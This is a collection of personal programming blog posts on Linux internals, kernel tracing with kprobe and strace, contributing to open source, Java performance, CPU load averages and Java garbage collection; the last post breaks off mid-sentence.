{"url": "https://jvns.ca/blog/2016/11/21/things-to-learn-about-linux/", "title": "Things to learn about Linux", "content": "\n      I asked on Twitter today what Linux things they would like to know more\nabout. I thought the replies were really cool so here’s a list (many of\nthem could be discussed on any Unixy OS, some of them are Linux-specific) \n\n \n tcp/ip & networking stuff \n what is a port/socket? \n seccomp \n systemd \n IPC (interprocess communication, pipes) \n permissions, setuid, sticky bits, how does chown work \n how the shell uses fork & exec \n how can I make my computer a router? \n process groups, session leaders, shell job control \n memory allocation, how do heaps work, what does malloc do? \n ttys, how do terminals work \n process scheduling \n drivers \n what’s the difference between Linux and Unix \n the kernel \n modern X servers \n how does X11 work? \n Linux’s zero-copy API (sendfile, splice, tee) \n what is dmesg even doing \n how kernel modules work \n embedded stuff: realtime, GPIO, etc \n btrfs \n QEMU/KVM \n shell redirection \n HAL \n chroot \n filesystems & inodes \n what is RSS, how do I know how much memory my process is using \n iptables \n what is a network interface exactly? \n what is syslog and how does it work? \n how are logs usually organized? \n virtual memory \n BPF \n bootloader, initrd, kernel parameters \n the  ip  command \n what are all the files that are not file files (/dev, stdin, /proc,\n/sys) \n dbus \n sed and awk \n namespaces, cgroups, docker, SELinux, AppArmor \n debuggers \n what’s the difference between threads and processes? \n if unix is text-based, how do desktop environments like GNOME fit in? \n how does the “man” system work. \n kpatch, kgraph, kexec \n more about the stack. Are C vars really stack slots? How tf do setjmp\nand longjmp work? \n package management \n mounts and vfs \n \n\n this is great for so many reasons! \n\n \n I need to draw 11 more drawings about Linux this month and these are\nsuch great ideas \n there are many things I don’t know on this list and it’s a cool\nreminder of how much interesting stuff there still is to learn! A few\nof these I barely even know what they are (dbus, SELinux) or only have a\npretty sketchy notion (seccomp, how X11 works, many more) \n it’s also a cool reminder of how far I’ve come – I at least know\nwhere to  start  with most of the things on this list, even if I\ndefinitely could not explain a lot of them in detail without looking\nsome stuff up. \n \n\n Also I sometimes want to remind people that you too could write\ninteresting\nblog posts / drawings on the internet – for instance “what is dmesg even doing” is\nan interesting topic, and totally possible to learn about! (I just\nread  dmesg  on Wikipedia and now I\nknow more!) \n\n"},
{"url": "https://jvns.ca/blog/2015/04/12/learning-at-open-source-sprints/", "title": "Learning at open source sprints (no preparation required)", "content": "\n      I’m someone who isn’t heavily involved in contributing code to OSS, and\nnormally go to sprints just to learn something new, and not with any\nparticular goals. This has never worked out that well for me, but I had\na new idea yesterday! Maybe if you’re like me it will help you. \n\n I was talking to someone yesterday about contributing to a relatively\ncomplicated open source project during the sprints. And we worked out\nthat they were super super interested in learning about the project’s\ninternals, and didn’t necessarily need to contribute to the project! \n\n Contributing to a project for the first time is hard. There’s a lot\nyou need to know! And the area of the project you’re interested in might\nnot necessarily need contributions right now! Or you might not be able\nto make the contribution you’re interested in on your first 3 days. \n\n So we came up with an AWESOME IDEA. Instead of trying to write a\ncontribution, change the goals! The next time I go to a sprint, I think\nI’ll just \n\n \n pick a project I’m interested in \n decide on a thing I’d like to learn about that project \n start digging into the project, running code, and learn about that\nthing \n not worry about contributing \n \n\n For me, I think this could be way more fun and that I’d learn a lot\nmore. And it would be fun to do this stuff near the team who works on\nthe project, regardless of whether or not they have time to help me :) \n\n And maybe, while exploring with no particular goal, I’d find a change\nthat needs making! :) Or if I wanted to contribute to the project 6\nmonths down the road, I’d be a little more prepared to do that. \n\n"},
{"url": "https://jvns.ca/blog/2016/01/18/guessing-linux-kernel-registers/", "title": "Guessing Linux kernel registers", "content": "\n     \n\n I have a long-standing project to try to learn to use ftrace, a Linux kernel tracing tool. As usual when I want to learn more, I turned to one of  Brendan Gregg ’s tools – the  perf-tools  repo on Github. There’s a whole delightful directory of  examples . It’s the best. \n\n He has a lot of tools that are ready to use and easy to understand – for instance, you can use execsnoop to see every program that’s being executed. Those are awesome. \n\n Then there are some that require… more work. I was interested in ftrace, and I was using his kprobe script to trace system calls and their arguments. \n\n I started out by running  sudo kernel/kprobe 'p:SyS_read'  to tell me every time the  read  system call happened. This gives me output like \n\n  Chrome_ChildIOT-8978  [000] d...  7402.349880: SyS_read: (SyS_read+0x0/0xa0)\n Chrome_ChildIOT-4102  [002] d...  7402.349922: SyS_read: (SyS_read+0x0/0xa0)\n            Xorg-1853  [001] d...  7402.349962: SyS_read: (SyS_read+0x0/0xa0)\n            Xorg-1853  [001] d...  7402.349969: SyS_read: (SyS_read+0x0/0xa0)\n Chrome_IOThread-4092  [003] d...  7402.349974: SyS_read: (SyS_read+0x0/0xa0)\n \n\n But WHAT FILE DID IT READ? This is not good at all. \n\n In the  example , he says, on the open system call. \n\n \n Here I guessed that the mode was in register %cx, and cast it as a 16-bit\nunsigned integer (”:u16”). Your platform and kernel may be different, and the\nmode may be in a different register. If fiddling with such registers becomes\ntoo painful or unreliable for you, consider installing kernel debuginfo and\nusing the named variables with perf_events “perf probe”. \n \n\n This was wizardry. How could he  guess  that the mode of a file was in the register  %cx ? What even are the registers? This makes no sense. \n\n I partly figured this out and got more information about the  read  system calls, so I will now tell you! \n\n what even is a register \n\n I know that registers are what the CPU uses to store data in when calculating things. But how many even are there? How do I guess which one is right? \n\n First, I found  this page describing x86 registers . It tells me that there are \n\n General registers\nEAX EBX ECX EDX\n\nSegment registers\nCS DS ES FS GS SS\n\nIndex and pointers\nESI EDI EBP EIP ESP\n \n\n From the description, the segment registers seem safe to ignore! Awesome. The instruction pointer and the stack pointer tell me what instruction is running right now and where the stack is. I also don’t care about that. So that leaves me with only 7 registers to worry about (eax, ebx, ecx, edx, esi, edi, and ebp). That’s way better. \n\n printing the registers \n\n So before we were running  sudo kernel/kprobe 'p:SyS_read' . We can also print the registers for the read system call! Here goes. For some reason we need to take off the  e . \n\n sudo kernel/kprobe 'p:SyS_read ax=%ax bx=%bx cx=%cx dx=%dx si=%si di=%di' | grep chrome-4095\n          chrome-4095  [001] d...  7665.279404: SyS_read: (SyS_read+0x0/0xa0) ax=0 bx=2cb4726adec0 cx=0 dx=2 si=7fff1282f70e di=9\n          chrome-4095  [001] d...  7665.279562: SyS_read: (SyS_read+0x0/0xa0) ax=0 bx=2cb4726adec0 cx=0 dx=2 si=7fff1282f70e di=9\n          chrome-4095  [002] d...  7665.400594: SyS_read: (SyS_read+0x0/0xa0) ax=0 bx=2cb4726adec0 cx=0 dx=2 si=7fff1282f70e di=9\n \n\n Let’s compare this to the output of strace: \n\n sudo strace -e read -p 4095\nProcess 4095 attached - interrupt to quit\nread(9, \"!\", 2)                         = 1\nread(9, \"!\", 2)                         = 1\nread(9, \"!\", 2)                         = 1\n \n\n Ok, awesome! In the output of  strace . I know that  9  is the file descriptor, 2 is the length to read, and the middle value is the string. This must mean that  %di  is the file descriptor, and  %dx  is the amount of data to read! \n\n I can label those now and be a register-guessing-wizard like Brendan Gregg! \n\n sudo kernel/kprobe 'p:julia_smart_read SyS_read fd=%di:u16 bytes_to_read=%dx' | grep chrome-4095\n          chrome-4095  [003] d...  7854.905089: julia_smart_read: (SyS_read+0x0/0xa0) fd=9 bytes_to_read=2\n          chrome-4095  [003] d...  7854.945585: julia_smart_read: (SyS_read+0x0/0xa0) fd=9 bytes_to_read=2\n          chrome-4095  [002] d...  7854.945852: julia_smart_read: (SyS_read+0x0/0xa0) fd=9 bytes_to_read=2\n \n\n So now I know which file descriptors are being read! \n\n The advantage of using ftrace instead of strace is that the overhead is way lower: when I strace  find  it makes it 20x slower, but with ftrace it’s totally okay. I’m still not sure where the string that we read is (I think it’s in  %si , though!) \n\n Now I am one step closer to being able to trace system calls with less overhead. Guessing registers is really tedious but it seems to be totally possible! \n\n update : turns out you don’t have to guess at all! the registers used for system calls are always the same :D.  here is a table with all the answers ❤ \n\n"},
{"url": "https://jvns.ca/blog/2016/10/26/a-few-questions-about-open-source/", "title": "A few questions about open source", "content": "\n     \n\n I’ve been thinking a bit about where open source software comes from and\nhow it works and when and how you should use it. I’m thinking about this\nin the context of working for a tech company, not a volunteer\ncontributor. (I do not contribute to open source in my spare time, I\nwrite this blog instead.) \n\n some facts: \n\n \n my company (and most tech companies) depend very heavily on open\nsource software (see  Roads and Bridges: the unseen labor behind our digital infrastructure [pdf] ) for a great overview \n a lot of open source software (even the important software) is\nmaintained by a very small number of people \n some companies spend a large amount of money developing open source\nsoftware (for instance people are paid to work on kubernetes) \n some open source software is really high quality and some isn’t \n also a lot of open source software is really really valuable (for example:\npostgresql, sqlite, openssl, nginx, hadoop just to name a few) \n \n\n and some questions: \n\n how can you tell when you should use an open source tool vs writing it yourself? \n\n Sometimes this is really obvious: I should almost certainly not write a\nweb server. Instead I should almost always use nginx or something! \n\n But sometimes the task I’m trying to do is kind of weird and not that\ncommon, and the open source tools available are.. kind of bad? \n\n some things that might help here: \n\n \n how many hours have been spent on the open source tool? is it a\nweekend side project? have there been 2 person-years spent developing\nit? \n does it have the same architecture as the thing I think I need, or has\nit made architecture choices that I think are bad? \n is it actually solving the problem that I have or does it do a bunch\nof extra stuff that isn’t my concern? \n \n\n using nginx instead of writing a web server myself probably saves me\nlike 2 years of developer time or something. But using open source I\nthink doesn’t always save you time! Sometimes it takes extra time and\nit’s not better. \n\n why do companies pay to create open source software? \n\n Here are some reasons I know right now! This reads as a bit cynical and\ni really do believe in the RAINBOWS PEOPLE WORKING TOGETHER TOWARDS THE IMPROVEMENT OF HUMANKIND version of open source but I am trying to understand some of\nthe more practical reasons right now. \n\n Paying people to develop open source software is super expensive\n(because paying people is expensive) so I want to work out some of the\nreasons why it happens. Mostly I want to work this out because a good\nchunk of the software I use someone  was  paid to write so I want to\nunderstand why. \n\n (also I would like to understand how it works when nobody is paid to\nwork on the software, but that is a whole other question) \n\n \n because you think investing in community-maintained open source software will be valuable for the business in the long term. there’s an\nexcellent  post by jessie frazelle  that talks about the relationship between individual passion for open source and a business investment \n because you need software (like the Linux kernel) to have new features and a bunch of\ncompanies have enough of the same needs from that software that it’s\nworth it for a bunch of people to get paid to build software that\neveryone gets to use \n you have to write the software anyway so you might as well open source\nit while you’re at it so that other people get to use it \n social pressure: a lot of people won’t use software that  isn’t  open\nsource so maybe if you’re releasing software for your customers to use\nyou have to release your software as open source to get anyone to use\nit at all. \n developers often like writing open source software so maybe it helps\nwith keeping people happy \n @mcpherrinm : “I will eventually quit\nmy job and want to keep using tools I wrote for this one. Open Source\nlets me do that” \n \n\n I think I’m missing a bunch of important reasons here. \n\n when you use open source, who wrote the software? what are their priorities? \n\n Right now I’m using some software called rkt at work. When I use rkt,\nit’s incredibly useful to me to know who runs the project (CoreOS), what\ntheir company priorities are right now (getting OCI working), how much\nthey’re likely to make improvements to the appc standard (not very) and\nhow willing they are to accept contributions (pretty likely!). \n\n I kinda feel like working on open source is like being\npart of a really big company and you have to know what the other people\nwho are paying to develop the software care about and what kind of\ncontributions they’re likely to accept / be enthusiastic about. \n\n how do you decide when to build software as open source? \n\n If you build something and make it open source, does the discipline of\nmaking it general help you build better software? Or does having to\nsupport other use cases get in the way of building something that will\nwork well for you? Probably it depends! But what does it depend on\nexactly? \n\n is it harmful to open source and promote software that doesn’t actually work well? \n\n Someone told me a story the other day of an open source thing they used\nfor a while. Eventually they figured out after a few months of pain that\nthis software actually just doesn’t really work that well and nobody\nreally uses it. Oops. \n\n On one hand this seems kind of irresponsible on the hand of the project\nmaintainers. On the other hand I’ve definitely released software where I\nhave  no idea  if anybody other than me has ever used it successfully,\nand I have no real intentions of finding out. Is that bad? I feel like\nmy current default assumption about software I find in the wild is that\nit is unmaintained and possibly nobody has ever used it except the\npeople who wrote it. Ideally people would write on the tin “we have no\nidea if anyone other than us has ever used this software successfully” though. \n\n how do you even evaluate software? \n\n Evaluating unknown software to decide if you should use it is really\nhard! I think the only thing that really makes it worth it is that, if\nyou genuinely cannot use known software to do the thing you want to do,\nyou need to either \n\n \n evaluate some unknown software, or \n write a thing yourself from scratch \n \n\n So maybe the saving grace of unknown software is that it is maybe\nsometimes faster than writing it all yourself? And spending the time to\nunderstand how a new thing works can save you a lot of time. Evaluating\nsoftware is hard and I still don’t really know how to do this well. \n\n A lot of the discussions I see on the internet comparing software are\nnot great. \n\n open source is very important and pretty confusing \n\n Anyway hopefully some of these questions are interesting. I don’t\nactually know a lot about how open source really works and I don’t work\non open source today – i think there are a lot of subtleties and\nfeelings and human things here around “community” and “passion” and\n“making money”. \n\n  thanks to Tavish for encouraging me to post this  \n\n"},
{"url": "https://jvns.ca/blog/2017/08/06/contributing-to-open-source/", "title": "Figuring out how to contribute to open source", "content": "\n     \n\n Lately at work I’ve been working more with large open source projects (like\nKubernetes and Terraform!) \n\n Sometimes there are bugs in those projects, or features I want to add! I\nhaven’t contributed to open source projects much in the past (beyond like\n“here’s a 2-line README fix”. (which is useful but is a lot easier than fixing\na bug) \n\n Historically my approach to bugs / missing features in open source projects has\nbeen to shrug, say “oh well”, and find a workaround or wait for a fix. But\nthese days I am trying to be more like I AM A PROGRAMMER I CAN MAKE THIS\nHAPPEN. Which is true! I can!! \n\n This post isn’t about “how to find small issues in open source projects to get\nstarted with open source” – instead it’s about “I have a specific change I\nwant to make to a specific project, what will help me get that done”. \n\n skills I already have \n\n I sometimes feel kind of intimidated by open source. When I feel intimidated I\nfind it helpful to remind myself that I’m a professional software developer and\nmost of the things you need to do to contribute to open source projects are\n already things I do every day at work . \n\n For example! \n\n \n make a clear/well-organized pull request \n write tests \n run tests and use a CI system \n navigate a codebase that is tens of thousands of lines of code \n figure out whether something is a bug or expected behavior \n read the code to figure out how the code is  supposed  to work\neven if there isn’t a project maintainer I can ask questions \n use git rebase & resolve merge conflicts \n other regular software stuff \n \n\n things that are still hard about open source \n\n Okay, so we have basic software engineering skills covered. What makes open\nsource contributions harder than my regular job, then? \n\n Here are some things that are harder! \n\n \n In open source, I need to send code reviews to total\nstrangers. At work, I generally send code reviews to the same 10 people or\nso, most of whom I’ve worked with for a year or more, and who often already\nknow exactly what I’m working on. \n At work, people mostly share the same goals as me. But if I have a change\nto an open source project that’s useful to my company, the open source\nmaintainers might not agree that that change is broadly useful enough to\ninclude. \n In open source, if I’m contributing to a new repository I need to learn the\nstandards and conventions from scratch. At work I basically always contribute\nto the same 3-4 repositories which I already know inside and out. \n In open source, the code I’m modifying is probably used in ways I don’t know\nabout. At work I usually already know (or can look up) every way the code I’m\nchanging is used. \n In open source, I can’t just DM the project maintainers with questions (or\nbug them about how they haven’t reviewed my PR) any time I want. \n \n\n This list is super useful to me! It takes us from “open source is hard and\nscary, how do I do it” from “there are a bunch of specific challenges when\ncontributing to open source projects that I don’t usually have to deal with,\nbut that’s fine, I just need to deal with them!” \n\n Here are a few tactics that have helped me when working with open source\nprojects. \n\n remember that maintaining an open source project is super hard \n\n One thing I always try to remember is – while contributing to an OSS project\nis definitely work,  maintaining  a project is often pretty thankless\nand is way more work. So through all of this I think it’s important to be\nreally respectful of open source maintainers’ time! \n\n They spend a ton of time doing code reviews and making sure the project\ncontinues to work for a huge variety of people and thinking about weird edge\ncases and a lot of stuff that any individual person contributing to the project\nprobably doesn’t have to think about anywhere near as much. And often\nmaintainers are volunteers – I think it’s useful to be aware of whether a\nproject’s maintainers are paid to maintain the project, or whether they’re\ndoing it for free on the side. \n\n start by making a tiny pull request \n\n I read this great short post  Easy Pull Requests \nrecently that recommends making a tiny pull request (like fixing a typo or\nsomething) first when getting started with a new open source project to get a\nsense for \n\n \n how quickly people respond to pull requests \n how friendly the maintainers are \n what the process for getting something merged is like \n \n\n I haven’t really done this but I think it makes a lot of sense. \n\n read way more code than usual \n\n Recently I fixed a bug in the Kubernetes scheduler. I did not know how the\nKubernetes scheduler worked and did not have anyone to ask about how it worked. \n\n So instead I just spent a bunch of hours scrolling through the scheduler code\nuntil I  understood how it worked .\nThis is maybe sort of obvious (“if you don’t have anybody to ask questions, just read\nthe code until you figure it out”) but code-reading is a muscle that maybe I don’t\nalways exercise as much as I could and so this was a good reminder of how far\nI can get without asking any questions at all. \n\n don’t be scared to share a work in progress \n\n If I’m making a PR I’m not sure of the details of how it should work, I’ll\noften start a  [WIP]  PR like “here’s a sketch, here are the details of what\nI’m trying to accomplish, what do you think?“. \n\n I think this is actually a super good idea in open source too (especially if\nI’m new to the project) – I’ve found that as long as I explain the idea\nclearly maintainers are happy to give early feedback and help me figure out\nwhat the right direction might be. \n\n write really detailed PR descriptions \n\n At work I often write pretty short PR descriptions because the people reviewing\nmy code usually already know more or less what I’m working on. \n\n I’ve been spending way more time on writing clear open source PR descriptions\n(like.. 5 minutes instead of 10 seconds?). So far it has gone really well! I\nwill write several paragraphs about what the PR is trying to accomplish, and so\nfar everyone seems to totally understand and then give me great code reviews. \n\n smaller pull requests are better \n\n When trying to fix this scheduler bug I started out by writing a PR (+79 lines,\n-25) which made a few different improvements related to the bug. It got a lot of\nhelpful code reviews but after a couple of days was clearly stuck. \n\n I decided “well, this PR is a little complicated and it’s editing a pretty\nsensitive piece of code, I will close it and break it up into 2 smaller PRs!“.\nThis turned out to be a GREAT IDEA – the new smaller PR got a lot more reviews\na lot more quickly and then got merged. Turns out making your code simpler gets\nyou more reviewers! :) \n\n Also I’ve been really impressed with the Kubernetes project overall, it seems\nwell organized so far! \n\n close the PR if nobody replies \n\n A while back I had a PR where originally I got a lot of super helpful reviews,\nbut after some back and forth eventually I said “ok, I fixed all the issues you\nbrought up, what do you think about merging this?” and they just didn’t really\nreply. \n\n I eventually said “ok, I’m going to close this in a week if nobody replies”.\nThey didn’t reply and I decided I didn’t want to spend any more time on it so I\njust closed it. I think this was an okay outcome! It was helpful to decide “ok,\nthis one isn’t working out right now for whatever reason, I’ll close this and\nmaybe revisit it one day later”. No big deal. \n\n use Slack / mailing lists? \n\n Throughout all of this so far my approach has been “I won’t ask anyone questions if\nI’m confused, I’ll just think really hard and eventually figure out the\nanswer”. So far this has been pretty effective. But a lot of open source\nprojects have a mailing list / Slack / gitter / IRC channel for discussion.  I\nhaven’t really figured this out yet because the social norms are kind of\nunclear to me (there are often hundreds or thousands of people in the\nKubernetes Slack channels and I don’t know almost any of them), but it seems\nlike something I should figure out. \n\n “open source” is a really big world \n\n There are a lot of open source projects with very very different degrees of \n\n \n whether they’re actively maintained at all (one person in their free time? 50\npeople who work on it full time?) \n how big the codebase is (100 lines? 1000 lines? 100,000 lines?) \n how many people use the project (how many people will be affected if something\nbreaks?) \n how good is the automated testing? \n basically every axis a software project could exist on \n \n\n So I think it’s hard to give general guidelines – most of what I’m trying to\ndo really just boils down to \n\n \n be respectful of maintainers’ time and contribute helpful patches \n communicate clearly what my goals are \n \n\n that’s all for now \n\n I used to want to / think I should contribute to open source in my spare time.\nI have mostly decided/realized that this is not going to happen. I spent many\nhours working on these two PRs to kubernetes and while I think this was a good\nuse of work time, I probably would not do that strictly for fun. (I write blog\nposts in my spare time, I don’t really code) \n\n But I do think “being able to make improvements to open source projects” is a\nsuper good work skill and it’s something I’m excited about getting better at.\nAnd I think it’s important for companies to contribute back to open source\nprojects they use, and I’m excited to be a very small part of that. \n\n"},
{"url": "https://jvns.ca/blog/2016/01/03/java-isnt-slow/", "title": "Java isn't slow", "content": "\n     \n\n This is probably obvious to many of you, but I wanted to write it down just in case. \n\n I used to write Java at work, and my Java programs were really slow. I thought\n(and people sometimes told me) that this was because Java is a slow programming\nlanguage. \n\n This just isn’t true. This article describes the architecture of the  LMAX Disruptor , a messaging library that they use to process 6 million events per second on a single machine. That article is also SUPER FASCINATING and really worth reading. Java is fast like C is fast (really fast). People write databases ( Cassandra ) in Java! \n\n By “Java is fast”, I mean something pretty specific – that you can comfortably do millions of things a second in Java. This isn’t true for languages like Python or Ruby – in the  computers-are-fast game I made , you can see that a pure-python HTTP request parser can parse 25,000 requests a second. I’d expect an optimized Java program to do dramatically better than that. \n\n So if your Java code is doing something easier than processing 6 million events a second, and it’s slow, you can maybe make it faster! Processing 6 million events per second is actually extremely difficult, but I find it inspiring to think about when I’m having trouble processing like.. 10 things per second :) \n\n My Java code was probably slow because I was creating like a bajillion objects all the time, and destroying them, and doing a bajillion allocations takes time, and also it puts pressure on the garbage collector, and… Well, you get the idea. But code like that is not the whole world! \n\n There’s a culture of building high-performance Java code out there. I asked on  twitter  and got linked to  this interesting-looking data structures library  and this  Java concurrency tools  repo. And to Netty! Netty is a networking framework (to build webservers, and other things!) in Java. The  Netty testimonials page  says that trading firms (who we all know care a lot about performance!!) use Netty. \n\n There’s this high performance  database connection pool  and a  page explaining how they made it fast .  Chronicle  is a key-value store in Java. And all that’s just what I got in 10 minutes from reading a few tweets! \n\n How to make your Java (or Scala, or Clojure) code fast \n\n This is a super small thing, but some people I talked to didn’t know this! \n\n Did you know the JVM ships with a free profiler that can tell you which part of your code is the slowest? It’s called  VisualVM . It’s very easy to use and it’s an AWESOME first step to take. Here’s a screenshot of VisualVM profiling VisualVM. It’s spending most of its time on  org.netbeans.swing.tabcontrol.TabbedContainer.paint . So it’s mostly working on drawing the screen to show me the results of profiling itself! \n\n \n\n ( YourKit  is better, but VisualVM is free) \n\n It won’t get you to LMAX disruptor speed (that’s much more serious wizardry), but it is a good first step! \n\n I had some  slow JVM code  at work a while ago. We made it fast. I used VisualVM! So can you :)  Computers  are  fast , and you should expect a lot out of your computer programs. \n\n"},
{"url": "https://jvns.ca/blog/2016/02/07/cpu-load-averages/", "title": "How CPU load averages work (and using them to triage webserver performance!)", "content": "\n     \n\n CPU load averages have long been a little mysterious to me. I understood that\nlow is good, and high is bad, but I thought of them as a mostly inscrutable\nnumber. I have now reached a small epiphany about them, which I would like to\nshare with you! \n\n I tweeted earlier today: \n\n \n I understand CPU load averages now! If I have a load average of 6, and am processing 60 requests/second, then each one takes  6 ⁄ 60 =0.1s of CPU time \n \n\n and someone  responded : \n\n \n CPU load average is the number of processes in the runnable state. Little to nothing to do with CPU time. \n \n\n I thought this was a totally reasonable response. I also still thought I was\n right , but I needed to do some work first, and it wouldn’t fit in a tweet. \n\n It turns out that I was kinda wrong, but I think also kinda right! What follows will hopefully be correct. When doing calculations, I’m going to assume that your processes using CPU are all doing it for the same reason, and that reason is to serve HTTP requests. \n\n Before I explain what load averages have to do with CPU time (spoiler: we’re\ngoing to do a tiny bit of queueing theory!), I want to tell you what a load\naverage is, and why the formula I tweeted is awesome. \n\n What’s a load average? \n\n Modern operating systems (since, like,  4.2BSD in 1983 ) can run more than one process on a single CPU (this is called “CPU scheduling”). My computer is running 300 processes right now! The operating system keeps track of a state for every process. The man page for  ps  lists them: \n\n PROCESS STATE CODES\n       Here are the different values that the s, stat and state output specifiers (header \"STAT\" or \"S\") will display to describe the state\n       of a process:\n       D    uninterruptible sleep (usually IO)\n       R    running or runnable (on run queue)\n       S    interruptible sleep (waiting for an event to complete)\n       T    stopped, either by a job control signal or because it is being traced.\n       W    paging (not valid since the 2.6.xx kernel)\n       X    dead (should never be seen)\n       Z    defunct (\"zombie\") process, terminated but not reaped by its parent.\n \n\n The load average is the average, in the last minute / 5 minutes / 15 minutes, of the number of processes in a running or runnable state. As far as I understand, ‘runnable’ means “I’d be running if you’d let me”. Processes that are asleep don’t count. Almost every process on my computer is asleep at any given time. \n\n Given this definition, you may understand why someone would say this has “Little to nothing to do with CPU time”. It doesn’t seem like it would! \n\n A quick note on multiple CPU cores \n\n If there are 3 processes that want to run on a CPU at the same time, and your computer has 4 CPU cores, then you’re totally okay! They can all run. So a load average of 3 is fine is you have 4 cores, and bad if you have 1 core. \n\n The number of cores you have doesn’t affect the formula we’re going to talk about here, though. \n\n Why CPU load averages are awesome \n\n The other day at work, I had a server that had a load average of 6. It was processing 60 HTTP requests per second. (the numbers here are all fake) \n\n Both of these numbers are easy to get! The load average is in the output of  top  (for instance  load average: 6.12, 6.01, 5.98 ), and I got the requests per second processed (or throughput) by counting log lines in the service’s log file. \n\n So! According to our formula from above, each request was taking 6 / 60 = 0.1s = 100ms of time using-or-waiting-for-the-CPU. I asked my awesome coworker to double check this division to make sure that was right. 100ms is a bajillion years of CPU time, and I was super concerned. That story is for another time! But being able to calculate that number so quickly was SUPER USEFUL to me for understanding the server’s performance. \n\n Why the formula is correct \n\n So! I posited this formula that tells you CPU time per request = load average / request throughput (requests per second). Why does that work? \n\n There’s this theorem called  Little’s Law , that states: \n\n \n The long-term average number of customers in a stable system L is equal to the long-term average effective arrival rate, λ, multiplied by the average time a customer spends in the system, W; or expressed algebraically: L = λW. \n \n\n This is pretty intuitive: if 10 people per hour (W) arrive at your store, and they spend 30 minutes each there (λ), then on average there will be 5 people (L) at a time in your store. \n\n Now, let’s imagine the CPU is your store, and that HTTP requests are people. The load average tells you how many processes at a time are in line to use the CPU (L). Since in my case I have 1 HTTP request / process, this is the same as the number of requests in line to use the CPU. Note that we care about the steady-state load average – if the load is constantly changing then it’s much harder to reason about. So we want the “average load average”. In my example system at work, the load average had been about 6 for a long time. \n\n If your system is in a steady state (constant load), then the rate of incoming requests will on average, over a long period of time, be the same as the rate of finishing requests. That rate is W. \n\n Lastly, λ is the amount of time each request spends on the CPU (in a running or runnable state). \n\n So: \n\n \n L = load average (average # requests in a running or runnable state) \n λ = average total time each request spends in a running or runnable state \n W = throughput (requests per second) \n \n\n So if we want to do my example from the previous section, we get: \n\n time spent on CPU = λ = L / W = 6 / 60 = 0.1s per request. \n\n Caveats \n\n There are quite a few assumptions built into this formula, which I’ll make explicit now. First, I told you “The load average tells you how many processes at a time are in line to use the CPU (L)”. This isn’t actually true! \n\n The  Wikipedia page on load averages remarks that : \n\n \n However, Linux also includes processes in uninterruptible sleep states (usually waiting for disk activity), which can lead to markedly different results if many processes remain blocked in I/O due to a busy or stalled I/O system. \n \n\n So, here are the cases when this “CPU time per request = load average / throughput” formula won’t work for you: \n\n \n some of your processes are in uninterruptible sleep \n your system has a highly fluctuating load average / throughput \n you’re handling more than 1 HTTP request per thread (for instance if you’re using Node or Go or…). \n the CPU activity on your system is caused by something other than your HTTP request processing \n this time (time running + time waiting for the CPU) includes time spent doing context switches between processes, and time spent on-CPU inside the kernel \n \n\n It’s also worth noting that the load average is an exponentially decaying average. This means that if your load average is changing over time, it’s hard to know what the non-exponentially-decaying load average is. \n\n There’s likely another caveat I’ve missed, but I think that’s most of them. \n\n a version for time spent  on  the CPU \n\n We’ve found a formula for “time the request spends on the CPU (or waiting for it to be free)”. But what if we wanted to ignore the time it spent waiting? I have an idea that I made up just now. \n\n If the CPU load is low (like, less than half your number of cores), I think it’s reasonable to assume that any process that wants to be scheduled gets scheduled immediately. So there’s nothing to do. \n\n But what if your CPU is overloaded? Suppose I have 4 CPUs. Then we could instead define \n\n \n L = average number of processes in a running state (which should be 4, since the CPU is at capacity) \n λ = average time each request spends in a running state \n W = throughput (requests per second) \n \n\n Then we can still try to calculate our new λ, from our example from before! \n\n λ = L / W = 4 / 60 = 0.066 s = 66ms per request on the CPU. \n\n I think this math still holds up, but it feels a little shakier to me. I would love comments on this. \n\n this formula = awesome \n\n I had a good experience with this formula yesterday! Being able to quickly triage the number of milliseconds of CPU time per request was an awesome start to doing some more in-depth performance analysis! (which I won’t go into here) \n\n I hope it will help you as well! If you think I’ve gotten this all wrong,  let me know on twitter  :) \n\n  Thanks to Kamal Marhubi, Darius Bacon, Dan Luu, and Sean Allen for comments  \n\n"},
{"url": "https://jvns.ca/blog/2016/04/23/some-links-on-java-garbage-collection/", "title": "Some links on Java garbage collection", "content": "\n      Basically every time I write a blog post like  yesterday’s on garbage collection , people reply with a huge amount of information about the topic; way more than I can take in immediately. This is great. Please do not stop doing that. \n\n I want to get better at recording what everyone tells me so I can refer back to it later when I need to know more. So here are some cool resources if you want to know more about Java garbage collection! I may add more as I come up with them. \n\n There’s a great series of blog posts by  Cory Watson  –  Why Garbage Collection ,  Java GC Tuning for Noobs: Part 1\n ,  Java GC Tuning for Noobs Part 2: Generational\n ,  GC Tuning for Noobs: Part 3, Parallelism\n . This is my favorite intro to Java GC so far because it’s so conversational and doesn’t assume a lot. In one of them he lists every JVM configuration flag. holy crap there are a lot of possible flags. No wonder people can spend their whole career just learning about Java and how to make it work well! \n\n My favorite thing is that he wrote that last post  this morning  and I read it and learned a ton from it. I love it when the awesome people I know write blog posts and it teaches me stuff. Please do this more everyone. \n\n A few people pointed out that  the docs from Oracle on GC tuning  are surprisingly quite useful. I often forget to check official documentation so this was a great reminder. \n\n Several people recommended the book  Java-Performance-The-Definitive-Guide  and its section about garbage collection. Good books are a goldmine so I will probably buy it. \n\n Hacker News, as it often does, provided a mix of extremely helpful and informative comments and insults ( comments here ). Stick with the informative comments, Hacker News. You all know so much great stuff <3. \n\n At this point so many people have told me that they appreciate that I blog about stuff that seems “obvious” to many people that comments like “in other news, the sky is blue” don’t bother me too much. Writing about stuff that is pretty well-known but not obvious to newcomers is one of my favorite things. If you already know everything I’m talking about, maybe tell me something new I don’t know and make my day! \n\n One of the many informative comments (from  __ph__ ) said: (quoting it here because it was so great and I don’t want to forget it). \n\n \n Probably a book needs to be written as in “Pragmatic Garbage Collection” summarizing some good practices to avoid surprises as the author of the article encountered. Having used Java since its creation and other GCed languages, I would summarize them as follows: \n\n \n avoid allocating objects on the heap which you do not have to allocate. The less fresh allocations you have, the less the GC has to do. That does not mean you should write ugly and complex code, but if the tool described in the article was for example grep-like, then one should not have to allocate each line read separately on the heap just to discard it. If possible use a buffer for reading in, if the io libraries allow it. \n generational GCs try to work around this a bit, as the youngest generation is collected very quickly, assuming the majority of the objects is already “dead” when it happens, only the “survivors” are copied to older generations. Make sure that the youngest generation is large enough, that this assumption is true and only objects are promoted to older generations which indeed have a longer lifetime. \n language/library design makes a huge difference how much pressure there is on the GC system. Less heap allocations help, also languages, which try not to create too complex heap layouts. In Java, an array of objects means an array of pointers to objects which could be scattered around the heap, while in Go you can have an array of structs which is one contiguous block of memory which drastically reduces heap complexity (but of course, is more effort to reallocate for growing). \n good library design can bring a lot of efficiency. At some point in time, just opening a 